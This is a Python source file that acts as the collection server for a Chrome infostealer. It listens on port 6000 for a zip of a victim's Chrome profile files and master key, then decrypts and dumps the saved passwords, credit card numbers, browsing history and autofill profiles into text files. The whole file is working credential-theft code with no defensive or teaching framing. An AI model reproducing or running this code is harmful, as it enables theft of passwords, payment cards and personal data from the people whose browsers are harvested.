import sqlite3
import os
import zipfile
import socket
from Crypto.Cipher import AES
from datetime import datetime, timedelta

def decrypt_data(encrypted_data, master_key):
    try:
        prefix = encrypted_data[:3]
        if prefix not in (b'v10', b'v20'):
            print("Unknown prefix:", prefix)
            return None

        iv = encrypted_data[3:15]             # 12-byte IV
        ciphertext = encrypted_data[15:-16]    # encrypted data
        tag = encrypted_data[-16:]            # 16-byte GCM tag

        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

        return decrypted_data.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Decryption error (len={len(encrypted_data)}): {e}")
        return None

def extract_passwords(login_data_path, master_key):
    passwords = []
    if not os.path.exists(login_data_path):
        print(f"Error: Login Data file '{login_data_path}' not found")
        return passwords

    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    except sqlite3.OperationalError as e:
        print("Login Data query failed:", e)
        conn.close()
        return passwords

    for url, username, encrypted_password in cursor.fetchall():
        if encrypted_password:
            password = decrypt_data(encrypted_password, master_key)
            if password:
                passwords.append((url, username, password))

    conn.close()
    return passwords

def extract_history(history_path):
    history = []
    if not os.path.exists(history_path):
        print(f"Error: History file '{history_path}' not found")
        return history

    conn = sqlite3.connect(history_path)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            SELECT urls.url, urls.title, visits.visit_time 
            FROM urls 
            JOIN visits ON urls.id = visits.url 
            ORDER BY visits.visit_time DESC
        """)
    except sqlite3.OperationalError as e:
        print("History query failed:", e)
        conn.close()
        return history

    for url, title, visit_time in cursor.fetchall():
        if visit_time:
            dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
            history.append((url, title, dt.strftime('%Y-%m-%d %H:%M:%S')))

    conn.close()
    return history

def extract_credit_cards(web_data_path, master_key):
    credit_cards = []
    if not os.path.exists(web_data_path):
        print(f"Error: Web Data file '{web_data_path}' not found")
        return credit_cards

    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    try:
        cursor.execute("""
            SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted 
            FROM credit_cards
        """)
    except sqlite3.OperationalError as e:
        print("Credit cards query failed:", e)
        conn.close()
        return credit_cards

    for name, exp_month, exp_year, encrypted_card in cursor.fetchall():
        if encrypted_card:
            card_number = decrypt_data(encrypted_card, master_key)
            if card_number:
                credit_cards.append((name, f"{exp_month}/{exp_year}", card_number))

    conn.close()
    return credit_cards

def extract_autofill(web_data_path):
    autofill_profiles = []
    if not os.path.exists(web_data_path):
        print(f"Error: Web Data file '{web_data_path}' not found")
        return autofill_profiles

    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    tables = [r[0] for r in cursor.execute("SELECT name FROM sqlite_master WHERE type='table';").fetchall()]
    if 'autofill_profiles' in tables:
        try:
            cursor.execute("""
                SELECT guid, full_name, company_name, street_address, city, state, zipcode, country_code, email_address, phone_number
                FROM autofill_profiles
            """)
            autofill_profiles = cursor.fetchall()
        except sqlite3.OperationalError:
            pass
    elif 'autofill' in tables:
        try:
            cursor.execute("SELECT name, value, value_lower, date_created, date_last_used, count FROM autofill")
            autofill_profiles = cursor.fetchall()
        except sqlite3.OperationalError:
            pass
    else:
        print("No autofill table found. Available tables:", tables)

    conn.close()
    return autofill_profiles

def receive_and_unzip_zip():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 6000))
    server_socket.listen(1)
    print("Listening on port 6000...")

    client_socket, addr = server_socket.accept()
    print(f"Connection from {addr}")

    # Receive file size first (4 bytes)
    size_data = client_socket.recv(4)
    if not size_data:
        client_socket.close()
        server_socket.close()
        return None
    file_size = int.from_bytes(size_data, byteorder='little')

    # Receive the zip file
    received_data = b""
    while len(received_data) < file_size:
        data = client_socket.recv(4096)
        if not data:
            break
        received_data += data

    client_socket.close()
    server_socket.close()

    if len(received_data) != file_size:
        print("Incomplete file received")
        return None

    temp_zip_path = "chrome.zip"
    with open(temp_zip_path, 'wb') as f:
        f.write(received_data)

    temp_dir = "temp_extracted"
    os.makedirs(temp_dir, exist_ok=True)
    with zipfile.ZipFile(temp_zip_path, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)

    # Find extracted files
    login_data = None
    history = None
    web_data = None
    master_key = None
    for root, _, files in os.walk(temp_dir):
        for file in files:
            if file == "Login Data":
                login_data = os.path.join(root, file)
            elif file == "History":
                history = os.path.join(root, file)
            elif file == "Web Data":
                web_data = os.path.join(root, file)
            elif file == "mskey.bin":
                master_key = os.path.join(root, file)

    os.remove(temp_zip_path)  # Clean up zip file
    return login_data, history, web_data, master_key

def main():
    files = receive_and_unzip_zip()
    if not files:
        print("Failed to receive or unzip chrome.zip")
        return

    login_data, history_path, web_data, master_key_path = files

    with open(master_key_path, 'rb') as f:
        master_key = f.read()

    passwords = extract_passwords(login_data, master_key)
    history = extract_history(history_path)
    credit_cards = extract_credit_cards(web_data, master_key)
    autofill_profiles = extract_autofill(web_data)

    passwords_output = "passwords.txt"
    with open(passwords_output, "w", encoding="utf-8") as f:
        f.write("Extracted Chrome Passwords:\n")
        for i, (url, username, password) in enumerate(passwords, 1):
            f.write(f"{i}. URL: {url}\n")
            f.write(f"   Username: {username}\n")
            f.write(f"   Password: {password}\n")
            f.write("-" * 50 + "\n")

    print(f"Successfully extracted {len(passwords)} passwords to {passwords_output}")

    history_output = "history.txt"
    with open(history_output, "w", encoding="utf-8") as f:
        f.write("Extracted Chrome Browsing History:\n")
        for i, (url, title, visit_time) in enumerate(history, 1):
            f.write(f"{i}. URL: {url}\n")
            f.write(f"   Title: {title}\n")
            f.write(f"   Visited: {visit_time}\n")
            f.write("-" * 50 + "\n")

    print(f"Successfully extracted {len(history)} history entries to {history_output}")

    credit_cards_output = "credit_cards.txt"
    with open(credit_cards_output, "w", encoding="utf-8") as f:
        f.write("Extracted Chrome Credit Cards:\n")
        for i, (name, expiry, card_number) in enumerate(credit_cards, 1):
            f.write(f"{i}. Name: {name}\n")
            f.write(f"   Expiry: {expiry}\n")
            f.write(f"   Card Number: {card_number}\n")
            f.write("-" * 50 + "\n")

    print(f"Successfully extracted {len(credit_cards)} credit cards to {credit_cards_output}")

    autofill_output = "autofill.txt"
    with open(autofill_output, "w", encoding="utf-8") as f:
        f.write("Extracted Chrome Autofill Profiles:\n")
        for i, row in enumerate(autofill_profiles, 1):
            f.write(f"{i}. {row}\n")
            f.write("-" * 50 + "\n")

    print(f"Successfully extracted {len(autofill_profiles)} autofill profiles to {autofill_output}")

    import shutil
    shutil.rmtree("temp_extracted")

if __name__ == "__main__":
    main()
